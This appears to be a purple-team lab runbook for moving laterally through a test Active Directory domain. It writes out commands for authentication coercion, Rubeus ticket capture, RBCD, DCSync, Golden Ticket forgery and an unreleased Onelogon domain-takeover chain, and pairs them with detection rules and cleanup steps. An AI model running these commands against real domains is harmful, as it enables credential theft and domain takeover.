# CAMPAIGNS v3 — Phase 5 — Lateral Movement (Coercion + Delegation)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 5 — Lateral Movement (Coercion + Delegation)


**This path was discovered in Phase 4:** BloodHound showed `mbr01$` has `TrustedForDelegation = True`. Without that discovery, we'd never know coercion was viable.


|                         |                                                       |
| ----------------------- | ----------------------------------------------------- |
| **Target**              | dc02 (.11) — coerced to auth to mbr01                 |
| **Source of this path** | BloodHound finding: `mbr01$` unconstrained delegation |
| **From**                | **mbr01** (Rubeus monitor) after T101 lateral move    |
| **MITRE**               | T1187 (Forced Authentication) + T1550.002 (Use Alternate Auth Mat: Kerberos) |


In the realistic multi-hop flow, **coercion runs from mbr01, not from Kali**. After T101 we already have a command channel on mbr01 as `child\analyst_t1`. From there we stage Rubeus as a listener and coerce dc02$ to authenticate.

#### T102 — Coerce dc02$ to mbr01 from the mbr01 beachhead

**Automation:** `attack-matrix/04-automation/linux/campaign-a/T102-coerce-dc02-ws01.sh` stages `campaign-a-t102-coerce-dc02.ps1` on `ws01` and runs it as `analyst_t1` via WinRM. The script copies `Rubeus.exe` and `SpoolSample.exe` from `ws01` to `mbr01`, starts `Rubeus monitor` as a background process, triggers `SpoolSample`, and pulls the monitor/spool logs back to `ws01`. Status: script created; execution paused pending user review.

**Manual run:**

**Step 1 — From `ws01`, copy Rubeus to `mbr01` via SMB (T1570) then start the monitor over WinRS:**

```powershell
# Copy from ws01 beachhead to mbr01 (analyst_t1 credentials)
$pass = ConvertTo-SecureString 'T13r_An@lyst!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('child.cadre.local\analyst_t1', $pass)
New-Item -ItemType Directory -Path '\\mbr01.child.cadre.local\C$\Tools\cadre-attack' -Force -Credential $cred | Out-Null
Copy-Item -Path 'C:\Tools\cadre-attack\Rubeus.exe' -Destination '\\mbr01.child.cadre.local\C$\Tools\cadre-attack\Rubeus.exe' -Force -Credential $cred

# Start Rubeus monitor on mbr01 via WinRS
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\cadre-attack\Rubeus.exe monitor /targetuser:DC02$ /interval:5 /filtername:DC02$ /output:C:\Tools\cadre-attack\dc02_tgs.txt"
```

**Step 2 — Trigger PrinterBug from mbr01 against dc02:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\MS-RPRN.exe \\dc02.child.cadre.local \\mbr01.child.cadre.local"
```

**Step 3 — Collect the captured TGS on mbr01:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
```

**Why this matters:** Real attackers don't keep every tool on their C2 server; they stage on intermediate hosts. Running coercion from `mbr01` means the source IP is a legitimate domain member, the listener and trigger are co-located, and the operator must manage tool staging on a beachhead rather than from a clean attacker box.

**Fallback from Kali (single-hop):** If WinRS lateral movement is blocked, the same coercion can be run directly from Kali for lab-learning purposes:

```bash
# From Kali: Coerce dc02$ to auth to mbr01
coercer coerce -l 192.168.77.22 -t 192.168.77.11 -d child.cadre.local \
  -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
```

#### Alternative Coercion Techniques

| WT# | Protocol | Tool Flag | Status |
|:---:|:---------|:----------|:-------|
| 017 | MS-RPRN (PrinterBug) | `--spoolsample` | ✅ Confirmed (12 fires per testing) |
| 018 | MS-EFSR (PetitPotam) | `--petitpotam` | ❌ Not on Server 2025 — `\PIPE\efsrpc` blocked |
| 019 | MS-DFSNM (DFSCoerce) | `--dfscoerce` | ❌ SMB-pipe DCE-RPC not supported by Suricata |
| 020 | MS-FSRVP (ShadowCoerce) | `--shadowcoerce` | ❌ Service not available on Server 2025 |
| 094 | **UnCanny Coerce (InstallService)** | `Invoke-InstallServiceCoerce.ps1` | 🔬 Deferred — requires Developer Mode on target VM + admin change to playbook (Track G) |
| 095 | **Onelogon Zero-Channel (single-channel NRPC)** | `python3 onelogon.py --set-password` | ⏳ Pending — gated on author PoC release (WOOT 2026, 2026-06-24). Bypasses ALL post-Zerologon hardening via `\PIPE\netlogon` over SMB/445. See Campaign_suggestions.md #76 |
| 096 | **NetExec `coerce_plus` (consolidated check)** 🆕 | `-M coerce_plus` | ⏳ Ready — single command checks PetitPotam/PrinterBug/DFSCoerce/MSEven. Use as Phase 5 pre-flight before individual exploit. See Campaign_suggestions.md #98 |

#### 096 — NetExec `coerce_plus` — Consolidated Coercion Primitive Check 🆕

**Source:** NetExec v1.5.1 `-M coerce_plus` module. Replaces running individual coercion checks (WT017-020, plus MSEven).

**Why this is the new primary recon:**
- **One command** checks PetitPotam, PrinterBug, DFSCoerce, MSEven, MS-RPRN variants
- Faster than running 5 individual `nxc -M <each>` checks
- Returns a single verdict per coercion method
- Should be the **pre-flight** before deploying specific exploits

```bash
# Run against all DCs
nxc smb 192.168.77.10,11,12 -u svc_mssql -p 's3rv1c3_MSSQL!' -M coerce_plus

# Output per DC:
# DC01:
#   DFSCoerce:  VULNERABLE
#   PetitPotam: VULNERABLE
#   PrinterBug: VULNERABLE
#   MSEven:     VULNERABLE
# DC02: similar
# DC03: similar
```

**CADRE applicability:** All 3 DCs presumed vulnerable to at least PrinterBug (MS-RPRN) since WT017 confirmed 12 fires on dc02. Run `coerce_plus` against all DCs to get full picture in one shot.

**When to use this over individual WT# checks:**
- **Phase 5 pre-flight** (before any coercion exploit) — get the full picture
- **Hardening validation** (after enabling mitigations) — verify all methods blocked
- **Quarterly assessment** — quick check that no new methods appear

**Telemetry:** Same as individual coercion modules (Suricata SID:1000050-1000053 for active exploitation; `coerce_plus` is a read-only check).

**Cross-references:** See Campaign_suggestions.md #98. Replaces the need for WT017-020 individual recon runs.

#### 094 — UnCanny Coerce: NTLM Coercion via Windows Store InstallService (0xHossam, 2026-06-19) ⏳

**Source:** https://github.com/0xHossam/UnCanny (cloned to `references/uncanny/UnCanny/`)
**MITRE:** T1187 Forced Authentication
**Vulnerability:** New NTLM coercion primitive via `Windows.Internal.InstallService.Control.InstallServiceControl` COM class (IID `e4893a99-9270-42b9-9a62-683d6ceed250`, vtable slot 8 = `CreateInstallServiceWork`). Loose-file AppX package registration gives a package whose `InstalledLocation` is a UNC; `InstallService.exe` running as `NT AUTHORITY\SYSTEM` then does `LoadLibraryW(<UNC>\InstallServicePlugin.dll)` which forces outbound SMB auth from the machine account.

**Pre-conditions to verify on CADRE VMs (BEFORE testing):**
```powershell
# Run on dc01/mbr01/mbr02 via WinRM from Kali
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" -Name "AllowDevelopmentWithoutDevLicense"
# = 1 → UnCanny testable
# = 0 → need to enable first (admin change to playbook 00-domain-deploy.yml)
```

**Step 1 — Patch impacket FileSystemName (per author):**

```bash
# On Kali — patch impacket-smbserver to return NTFS instead of XTFS
# (AppX refuses to register on non-NTFS shares with 0x80073CFD)
sed -i 's/XTFS/NTFS/g' /usr/share/impacket/impacket/smbserver.py
```

**Step 2 — Start impacket SMB server with share:**

```bash
mkdir -p /tmp/coerce && cp references/uncanny/UnCanny/poc/AppxManifest.xml /tmp/coerce/
# setup.sh from repo also stages logo.png and dummy.exe
bash references/uncanny/UnCanny/poc/setup.sh
# or manual:
impacket-smbserver coerce /tmp/coerce/ -smb2support -username guest -password guest
```

**Step 3 — Trigger from mbr01 as standard user (e.g., `intern_blue`):**

```powershell
# Register the UNC package
Add-AppxPackage -Register \\192.168.77.60\coerce\AppxManifest.xml
# Note the Package Family Name returned

# Trigger the coercion
Invoke-InstallServiceCoerce.ps1 -AttackerHost 192.168.77.60 -Share coerce
```

**Step 4 — Capture machine account NTLM on Kali:**

- impacket-smbserver will log the auth attempt
- Crack with `hashcat -m 13100` (RC4) or `-m 19700` (AES256)

**Chain with existing campaign:**

- NTLM relay to ADCS ESC8 (Branch B) — standard user → dc01$ auth → ESC8 cert → DA
- DCSync using captured `dc01$` NTLM (requires admin on dc01$, which ESC8 provides)

*Detection rules (cadre- candidates):**

- `Add-AppxPackage -Register` with UNC path in command line (`logs-endpoint.events.process-`*)
- Outbound SMB from `InstallService.exe` (SYSTEM) to non-RFC1918 host (`logs-endpoint.events.network-*`)
- `CreateInstallServiceWork` COM call from non-system context (`Microsoft-Windows-COM` events)

**Status:** 🔬 Deferred — gated on Developer Mode check on dc01/mbr01/mbr02. If OFF, escalate decision on whether to enable in playbook. Per user 2026-06-19: "document only, defer test" — see Campaign_suggestions.md Track G for deferred path.

#### 095 — Onelogon Zero-Channel: Single-Channel NRPC Authentication Bypass (Pădurean, WOOT 2026) ⏳

**Source:** "Onelogon: An Authentication Bypass for Windows Active Directory via Single-Channel Netlogon" — Alexandru-Vlad Pădurean, WOOT 2026 (Aug 1-3 2026). Paper text at `C:\STUDY\Github\CADRE-Platform\CADRE-Courses\woot2026-onelogon\woot2026-onelogon.txt`. Same author as `krbrelayx` (Kerberos relaying toolkit).
**MITRE:** T1190 (Exploit Public-Facing Application) + T1187 (Forced Authentication) + T1078.002 (Valid Accounts: Domain Accounts)

**Vulnerability:** MS-NRPC (Netlogon Remote Protocol) defines two channels:
- **Multi-channel** — direct TCP (typically port 135 EPM + high port). Used for DC-to-DC replication.
- **Single-channel** — TCP/445 (SMB) via `\PIPE\netlogon` named pipe. Used for client-to-DC authentication.

Post-Zerologon hardening (CVE-2020-1472 patch + SpecterOps "Renaissance of NTLM Relay Attacks" 2025 mitigations) added a **mandatory secure-RPC seal** requirement — but only to the multi-channel variant. **Single-channel NRPC over SMB accepts the legacy non-secure-RPC form.** This means the pre-Zerologon NRPC protocol is still reachable via SMB/445, exposing:
- **Zero-Channel (Section 5.2):** Call `NetrServerPasswordSet2` against target DC's machine account → set DC machine account password to attacker-known value → DCSync with new password → full domain takeover in 1 RPC call.
- **AES-CBC8 Downgrade (Section 5.1):** RFC 4753 weak DES challenge-response; compute hash of ANY password (machine, KRBTGT, user) offline.

**Author tested on:** Windows Server 2022 (latest patches). Server 2025 not explicitly tested but the single-channel path is identical on all Server 2016+ — hardening is what changed in 2020+, and it doesn't cover this path. **All 3 CADRE DCs (dc01/dc02/dc03) are presumed vulnerable** until proven otherwise.

**Pre-conditions (all met on CADRE):**

| # | Requirement | CADRE status |
|---|-------------|--------------|
| 1 | Network access to TCP/445 (SMB) on target DC | ✅ Default on all 3 DCs |
| 2 | Knowledge of target DC machine account name | ✅ `DC01$` / `DC02$` / `DC03$` — discoverable via Phase 0 Kerberos enum (SPNs are public) |
| 3 | NTLM relay of target DC machine account OR knowledge of machine account password | ✅ Achievable via WT017 (MS-RPRN PrinterBug coercion — 12 Suricata SID:1000050 fires confirmed) |

**Step 1 — Coerce target DC to authenticate to attacker listener (from Kali):**

```bash
# Capture DC machine account via WT017 PrinterBug (already working on CADRE)
coercer coerce -t 192.168.77.10 -l 192.168.77.22 -d cadre.local \
  -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
# OR if coercing dc02 (child.cadre.local):
coercer coerce -t 192.168.77.11 -l 192.168.77.22 -d child.cadre.local \
  -u svc_mssql -p 's3rv1c3_MSSQL!' --spoolsample
```

**Step 2 — Capture DC machine account NTLMv2 on impacket-smbserver:**

- impacket-smbserver logs the auth attempt from `DC01$` (or `DC02$`)
- Crack with `hashcat -m 5600 captured.txt cadre_passwords.txt` (NTLMv2)
- **CADRE-specific:** Machine accounts rotate automatically every 30 days — capture-then-crack window is short. Hashcat against `cadre_passwords.txt` (7 known passwords + 17 decoys, `ansible/files/cadre_passwords.txt`) is the fastest path.

**Step 3 — Run Onelogon Zero-Channel (predicted interface — gated on author PoC release):**

```bash
# Set DC machine account password to attacker-known value
python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 \
  --auth 'DC01$:<cracked_hash>' \
  --set-password 'Pwn3dBy0ne!0g0n!'

# OR Onelogon AES-CBC8 — extract KRBTGT hash directly:
python3 onelogon.py --dc 192.168.77.10 --dc-name DC01 \
  --auth 'DC01$:<cracked_hash>' \
  --extract-hash krbtgt
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

**Step 4 — DCSync with new password (Zero-Channel path) or forge Golden Ticket directly (AES-CBC8 path):**

```bash
# Zero-Channel → DCSync → KRBTGT → Golden Ticket chain
impacket-secretsdump -just-dc 'cadre.local/Administrator@192.168.77.10' \
  -hashes :<new_dc01_hash>
# Now have full hash dump including krbtgt
python3 ticketer.py -nthash <KRBTGT_NT_HASH> -domain-sid S-1-5-21-... \
  -domain cadre.local Administrator
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-psexec -k -no-pass cadre.local/Administrator@dc01.cadre.local
```

**Why this is more impactful than existing campaign paths:**

- **Single RPC call = DA.** No need for Kerberos ticket forgery, NTLM relay chain, or RBCD setup.
- **Works on patched Server 2025.** Bypasses every post-Zerologon hardening deployed since 2020 — including the Microsoft fixes that "patched" the original Zerologon.
- **No "vulnerable target" prerequisite.** Unlike WT017 which needs Print Spooler running, Onelogon works against any DC with SMB/445 exposed (default).
- **Direct KRBTGT theft via Section 5.1.** Bypasses DCSync entirely.

**Chain with existing campaign (5 routes from WT095):**

| Route | Downstream | Outcome |
|-------|-----------|---------|
| 1 | WT009 DCSync with new DC machine password | All hashes → KRBTGT → Golden Ticket |
| 2 | Direct AES-CBC8 → KRBTGT hash | Skip DCSync, instant Golden Ticket |
| 3 | RBCD on DC computer object (no Domain Controller OU protection) | DA via RBCD on dc01$ |
| 4 | Branch B ADCS ESC1 with new DA privs | DA cert → auth as any user |
| 5 | Phase 8 (Forest Trust) — compromise child DC's parent TGT, inject SID history | Enterprise Admin (CADRE trust has SID Filter OFF — verified in `01-core-ad.yml`) |

**Detection (cadre-* candidates):**

- **Suricata SID:1000098 (new):** Flag any non-DC source authenticating to `\PIPE\netlogon` over SMB/445. Normal client-to-DC traffic is fine; the signal is server-to-server patterns (DC machine accounts authenticating to other DCs is expected; any other source pattern is suspect).
- **WinSec 4662 (DS object accessed):** For Zero-Channel — `WriteProperty` on `CN=DC01,...,OU=Domain Controllers,...` with `ObjectType:unicodePwd` (or generic WriteProperty on the computer object) is the **highest-signal event**. Should NEVER happen in normal AD operation.
- **WinSec 4624 (logon) Type 3** from non-admin source shortly after SMB/445 to DC.
- **Zeek `zeek-smb.log`:** Named-pipe `netlogon` access from non-DC source. New Zeek notice in `cadre-nrpc.zeek` (script to be written).
- **Elastic KQL candidate:** `event.code:4662 AND winlog.event_data.ObjectDN:*CN=DC0* AND winlog.event_data.AccessMask:"0000000000000010"` (WriteProperty on DC machine account).
- **AES-CBC8 detection:** Weak DES challenge-response on NRPC. Zeek can't decode NRPC natively but Suricata can via SMB-dissector-on-netrlogon-pipe. New Suricata SID:1000099 for AES-CBC8 cipher in NRPC.

**Reset / Cleanup (CRITICAL):**

```powershell
# On the DC that was compromised (dc01 in this example):
Reset-ComputerMachinePassword -Server dc01.cadre.local -Credential (Get-Credential)
# This re-establishes the DC's machine account password with the DC itself
# Without this step, AD replication breaks across the forest
# Run from any DC in the same domain
```

**Status:** ⏳ Pending — gated on author PoC release post-WOOT 2026 (expected Aug 2026). Author's repo not yet published at time of this entry (2026-06-24, paper appears 7 days before conference). When PoC is released, add to:
- `references/sources/onelogon/` (clone, source-only)
- `references/onelogon-analysis.md` (full breakdown)
- External references #123+ in `external-references.md`
- Mechanics section in CAMPAIGNS-METADATA-v2.md (currently stub)
- plan1.7 §16 (detection engineering)
- Update WT095 status from ⏳ to ✅ once executed in lab

**Pre-test verification checklist (do BEFORE author PoC release):**
- [ ] Confirm SMB/445 reachable from Kali to dc01.cadre.local
- [ ] Confirm SMB/445 reachable from Kali to dc02.child.cadre.local
- [ ] Confirm `DC01$` / `DC02$` / `DC03$` machine account names via `getTGT.py` no-pass test (should fail with KDC_ERR_PREAUTH_REQUIRED → confirms account exists)
- [ ] Verify WT017 PrinterBug still works (12 Suricata fires per existing test)
- [ ] Snapshot dc01, dc02, dc03 before testing (Restore required post-test)
- [ ] Prepare `Reset-ComputerMachinePassword` reset script ready to run after attack

#### Alternative: RBCD (WT007)

If you find GenericWrite on a computer object instead of unconstrained delegation:

```bash
bloodyAD --host dc02 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' \
  add computer "FakePC$" "Password123!"
bloodyAD --host dc02 -d child.cadre.local -u svc_mssql -p 's3rv1c3_MSSQL!' \
  set rbcd "CN=mbr01,CN=Computers,DC=child,DC=cadre,DC=local" \
  "CN=FakePC,CN=Computers,DC=child,DC=cadre,DC=local"
```

#### Alternative: NTLM Relay (WT021-022)


| WT# | Protocol   | Target      | Condition                               |
| --- | ---------- | ----------- | --------------------------------------- |
| 021 | LDAP relay | dc01 (.10)  | Add Shadow Credentials via relayed auth |
| 022 | SMB relay  | mbr02 (.23) | SMB signing disabled                    |


#### G — Lateral Techniques (Inline)


| G WT# | Technique                 | Detection                 |
| ----- | ------------------------- | ------------------------- |
| 084   | WMI Lateral (T1047)       | Sysmon EID 1 (wmic.exe)   |
| 085   | WinRM Lateral (T1021.006) | Sysmon EID 1 (winrs.exe)  |
| 086   | RDP Lateral (T1021.001)   | WinSec 4624 Type 10       |
| 087   | Pass-the-Hash (T1550.002) | WinSec 4624 Type 3 (NTLM) |

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-4.md`](CAMPAIGNS-RUNBOOK-4.md) · Next: [`CAMPAIGNS-RUNBOOK-6.md`](CAMPAIGNS-RUNBOOK-6.md) →
